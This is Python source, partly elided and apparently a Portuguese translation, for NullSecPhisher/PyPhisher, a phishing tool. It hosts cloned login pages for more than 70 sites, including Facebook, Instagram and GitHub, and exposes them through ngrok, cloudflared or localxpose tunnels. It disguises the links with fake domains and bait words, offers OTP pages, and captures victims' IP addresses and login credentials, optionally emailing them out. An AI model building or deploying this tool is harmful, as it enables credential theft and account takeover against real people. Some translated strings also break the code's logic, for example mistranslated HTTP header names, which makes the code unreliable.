# -*- coding: UTF-8 -*-
# Nome da Ferramenta : NullSecPhisher
# Autor              : BlackTrace
# Versão             : 2.0
# Github             : https://github.com/BlackTracee
# Descrição          : PyPhisher é uma ferramenta de phishing em Python
# Tags               : Phishing Facebook, Phishing Github, Phishing Instagram e mais de 70 outros sites disponíveis
# Linguagem          : Python
# Arquivo/script portátil
...
AUTORES OU DETENTORES DE COPYRIGHT SERÃO RESPONSÁVEIS POR QUALQUER RECLAMAÇÃO, DANOS OU OUTRA
RESPONSABILIDADE, SEJA EM AÇÃO CONTRATUAL, DELITUAL OU OUTRA, DECORRENTE DE,
...
nr_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Ir para {green}https://ngrok.com
{blue}[2]{yellow} Criar uma conta 
{blue}[3]{yellow} Faça login na sua conta
{blue}[4]{yellow} Visitar {green}https://dashboard.ngrok.com/get-started/your-authtoken{yellow} e copie seu authtoken
"""

lx_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Ir para {green}https://localxpose.io
{blue}[2]{yellow} Criar uma conta 
{blue}[3]{yellow} Faça login na sua conta
{blue}[4]{yellow} Visitar {green}https://localxpose.io/dashboard/access{yellow} e copie seu authtoken
"""
...
if version_info[0] != supported_version:
    print(f"{error}Somente versão Python {supported_version} é suportado!\nSua versão do python é {version_info[0]}")
    exit(0)
...
for module in modules:
    try:
        ...
        try:
            ...
            print(f"{module} não pode ser instalado! Instale-o manualmente por {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)
...
argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"Porta do servidor PyPhisher [Padrão: {default_port}]")
argparser.add_argument("-o", "--option", help="Índice de modelo do PyPhisher [Padrão: nulo]")
argparser.add_argument("-t", "--tunneler", default=default_tunneler, help=f"Tunneler a ser escolhido durante o encurtamento de URL [Padrão: {default_tunneler}]")
argparser.add_argument("-r", "--region", help="Região para ngrok e loclx [Padrão: auto]")
argparser.add_argument("-s", "--subdomain", help="Subdomínio para ngrok e loclx [Pro Account] (Default: null)")
argparser.add_argument("-u", "--url", help="URL de redirecionamento após captura de dados [Default: null]")
argparser.add_argument("-m", "--mode", help="Modo do PyPhisher [Default:: normal]")
argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
argparser.add_argument("--nokey", help="Use localtunnel sem chave ssh [Default: False]", action="store_false")
argparser.add_argument("--noupdate", help="Pular verificação de atualização [Default : False]", action="store_false")
...
def exception_handler(e):
    ...
    print(f"{error}{name}: {message} em linhas {lines_no}")
    ...
    for i in range(retry):
        try:
            ...
            with open(path, "wb") as file:
                ...
                total_length = response.headers.get('comprimento do conteúdo')
            ...
            remove(path)
            append(e, error_file)
            print(f"\n{error}O download falhou devido a: {str(e)}")
            print(f"\n{info}Tentando novamente {i}/{retry}{nc}")
            sleep(1)
    if not isfile(path):
        print(f"\n{error}O download falhou permanentemente!")
        pexit()
...
def show_options(sites):
    ...
    if isfile(saved_file) and cat(saved_file)!="":
        options += f"{green}[{white}a{green}]{yellow} Sobre      {green}[{white}s{green}]{yellow} Salvo      {green}[{white}x{green}]{yellow} Mais ferramentas      {green}[{white}0{green}]{yellow} Sair\n\n"
    else:
        options += f"{green}[{white}a{green}]{yellow} Sobre                   {green}[{white}m{green}]{yellow} Menu principal         {green}[{white}0{green}]{yellow} Sair\n\n"
    lolcat(options)
...
def nr_token():
    ...
    while True:
        if isfile(f"{home}/.config/ngrok/ngrok.yml") or isfile(f"{home}/.ngrok2/ngrok.yml"):
             break
        has_token = input(f"\n{ask}Você tem o ngrok authtoken? [y/N/help]: {green}")
        if has_token == "y":
            token = input(f"\n{ask}Digite seu token automático ngrok: {green}")
            shell(f"{nr_command} configurar add-authtoken {token}")
            sleep(1)
            break
        elif has_token == "ajuda":
            sprint(nr_help, 0.01)
            sleep(3)
        elif has_token in ["n", ""]:
            break
        else:
            print(f"\n{error}Entrada inválida '{has_token}'!")
            sleep(1)
...
def lx_token():
    global lx_command
    while True:
        status = shell(f"{lx_command} status da conta", True).stdout.decode("utf-8").strip().lower()
        if not "error" in status:
            break
        has_token = input(f"\n{ask}Você tem loclx authtoken? [y/N/help]: {green}")
        if has_token == "y":
            shell(f"{lx_command} login da conta")
            break
        elif has_token == "Ajuda":
            sprint(lx_help, 0.01)
            sleep(3)
...
def ssh_key():
    if key and not isfile(f"{home}/.ssh/id_rsa.pub"):
        print(f"\n{info}Por favor, espere um pouco! Pressione Enter três vezes quando solicitado para geração de chave SSH{nc}\n")
        sleep(1)
        shell("ssh-keygen")
...
def customfol():
    global mask
    while True:
        fol = input(f"\n{ask}Digite o diretório > {green}")
        if isdir(fol):
            if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html"):
                inputmask = input(f"\n{ask}Insira uma frase de isca (Exemplo: dinheiro grátis) > {green}")
                ...
                sprint(f"\n{error}index.php/index.html obrigatório, mas não encontrado!")
        else:
...
def about():
    clear()
    print(f"{red}{yellow}[{purple}Nome Da Ferramenta{yellow}]      {cyan} : {yellow}[{green}\x50\x79\x50\x68\x69\x73\x68\x65\x72{yellow}] ")
    print(f"{red}{yellow}[{purple}Versão{yellow}]       {cyan} : {yellow}[{green}{version}{yellow}] ")
    print(f"{red}{yellow}[{purple}Autor{yellow}]        {cyan} : {yellow}[{green}\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
    ...
    print(f"{red}{yellow}[{purple}Mensagem{yellow}]     {cyan} : {yellow}[{green}https://m.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}\x6b\x61\x73\x72\x6f\x75\x64\x72\x61krd@gmail.com{yellow}] ")
    print(f"\n{green}[{white}0{green}]{yellow} Sair                     {green}[{white}x{green}]{yellow} Menu principal       \n")
    inp = input(f"\n{ask}Escolha sua opção: {green}")
    if inp == "0":
        pexit()
    else:
...
def masking(url):
    cust = input(f"\n{ask}{bcyan}Quer experimentar um link personalizado? {green}[{blue}ou pressione enter para pular{green}] : {yellow}")
    if cust in [ "", "n", "N", "no" ]:
        return
    if (shortened:=shortener1(url)) != "":
        ...
        sprint(f"{error}Serviço não disponível!")
        waiter()
    short = shortened.replace("https://", "")
    domain = input(f"\n{ask}Insira um domínio personalizado (Exemplo: google.com, yahoo.com > ")
    if domain == "":
        sprint(f"\n{error}Sem domínio!")
        domain = "https://"
    else:
        ...
        domain = "https://"+domain+"-"
    bait = input(f"\n{ask}Insira palavras de isca com hífen sem espaço (Exemplo: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}Nenhuma palavra de isca!")
    else:
        bait = sub("([/%+&?={} ])", "-", bait)+"@"
...
def updater():
    ...
    if git_ver != "404: Not Found" and float(git_ver) > float(version):
        ...
        clear(fast=True)
        print(f"{info}\x50\x79\x50\x68\x69\x73\x68\x65\x72 tem uma nova atualização!\n{info2}Atual: {red}{version}\n{info}Disponível: {green}{git_ver}")
        upask=input(f"\n{ask}Você quer atualizar \x50\x79\x50\x68\x69\x73\x68\x65\x72?[y/n] > {green}")
        if upask=="y":
            print(nc)
            ...
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Registro de alterações:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Atualização cancelada. Usando a versão antiga!")
            sleep(2)
        else:
            print(f"\n{error}Entrada errada!\n")
            sleep(2)
...
def requirements():
    ...
    for package in packages:
        if not is_installed(package):
            sprint(f"{error}{package} não pode ser instalado. Instale-o manualmente!{nc}")
            exit(1)
    killer()
    osinfo = uname()
    ...
    if "linux" in platform:
        ...
        if "x86_64" in architecture or "amd64" in architecture:
            ...
            if not isngrok:
                ...
                remove("ngrok.zip")
            if not iscloudflared:
                print(f"{error}Arquitetura do dispositivo desconhecida. Baixe o cloudflared manualmente!")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip", "loclx.zip")
        else:
            print(f"{error}Arquitetura do dispositivo desconhecida. Baixe ngrok/cloudflared/loclx manualmente!")
            sleep(3)
    else:
        print(f"{error}Dispositivo não suportado!")
        exit(1)
    if isfile("loclx.zip"):
    ...
    for process in processes:
        if is_running(process):
            print(f"\n{error}Anterior {process} ainda rodando! Por favor reinicie o terminal e tente novamente{nc}")
            pexit()
    ...
    if isfile("websites.zip"):
        ...
        print(f"\n{info}Copiando arquivos do site...")
    ...
    if is_json(email_config):
        ...
        password = email_json["senha"]
        receiver = email_json["receptor"]
        if "@gmail.com" in email:
            is_mail_ok = True
        else:
            print(f"\n{error}Somente o Gmail com senha de aplicativo é permitido!{nc}")
            sleep(1)
...
def main_menu():
    ...
    if is_json(tempdata):
        ...
        sprint(f"\n{error}O arquivo templates.json está corrompido!")
        exit(1)
    customdir = None
    otp_folder = ""
    names = [site["nome"] for site in sites]
    ...
    while True:
        ...
        if option is not None:
            ...
            choice = input(f"{ask}Selecione uma das opções > {green}")
        ...
        if choice in choices:
            ...
            if folder == "custom" and mask == "custom":
                customdir = customfol()
            if otp_folder != "":
                is_otp = input(f"\n{ask}Você quer a página OTP? [y/n] > {green}")
                if is_otp == "y":
                    folder = otp_folder
            break
        elif choice.lower()=="a":
    ...
    if customdir is None:
        ...
        if mode == "test":
            ...
            metaurl = input(f"\n{ask}{bcyan}Insira a URL da sombra {green}({blue}para visualização nas redes sociais{green}){bcyan}[{red}pressione enter para pular{bcyan}] : {green}")
        write_meta(metaurl)
        if url is not None:
            redirect_url = url
        else:
            if mode == "test":
                ...
                redirect_url = input(f"\n{ask}{bcyan}Insira a URL de redirecionamento{bcyan}[{red}pressione enter para pular{bcyan}] : {green}")
...
def server():
    ...
    clear()
    if termux:
        sprint(f"\n{info}Se você não habilitou o hotspot, habilite-o!")
        sleep(2)
    sprint(f"\n{info2}Inicializando o servidor PHP no localhost:{port}....")
    ...
    try:
        ...
        status_code = 400
    if status_code <= 400:
        sprint(f"\n{info}O servidor PHP foi iniciado com sucesso!")
    else:
        sprint(f"\n{error}Erro PHP! Código: {status_code}")
        pexit()
    sprint(f"\n{info2}Inicializando tuneladores no mesmo endereço...")
    internet()
    arguments = ""
    ...
    if nr_success or cf_success or lx_success or lhr_success:
        sprint(f"\n{info}Seus URLs são fornecidos abaixo:\n")
        if mode == "test":
            print(f"\n{info}A geração de URL foi concluída com sucesso!")
        ...
        if nr_success and tunneler.lower() in [ "ngrok", "nr" ]:
            ...
            print(f"\n{error}O mascaramento de URL não está disponível para {tunneler}!{nc}")
    else:
        sprint(f"\n{error}To desenelamento falhou! Use seu próprio serviço de tunelamento no porto {port}!{nc}")
        if mode == "test":
            exit(1)
    waiter()
...
def waiter():
    ...
    sprint(f"\n{info}{blue}Aguardando informações de login...{cyan}Pressione {red}Ctrl+C{cyan} para sair...")
    try:
        while True:
            if isfile(ip_file):
                print(f"\n\n{success}{bgreen}IP da vítima encontrado!\n\007")
                show_file_data(ip_file)
                ipdata = cat(ip_file)
                append(ipdata, main_ip)
                # Just add the ip
                append(ipdata.split("\n")[0], saved_file)
                print(f"\n{info2}Salvo em {main_ip}")
                print(f"\n{info}{blue}Esperando o próximo...{cyan}Pressione {red}Ctrl+C{cyan} para sair...")
                remove(ip_file)
            if isfile(cred_file):
                print(f"\n\n{success}{bgreen}Informações de login da vítima encontradas!\n\007")
